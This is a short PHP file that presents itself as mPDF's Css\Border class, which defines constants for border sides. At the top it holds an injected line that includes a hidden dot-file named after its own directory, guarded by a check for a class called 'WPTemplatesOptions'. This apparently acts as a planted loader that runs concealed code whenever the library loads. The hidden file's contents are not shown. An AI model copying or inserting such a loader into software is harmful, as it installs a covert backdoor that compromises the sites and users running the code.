<?php

namespace Mpdf\Css;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Border
{

	const ALL = 15;
	const TOP = 8;
	const RIGHT = 4;
	const BOTTOM = 2;
	const LEFT = 1;
}
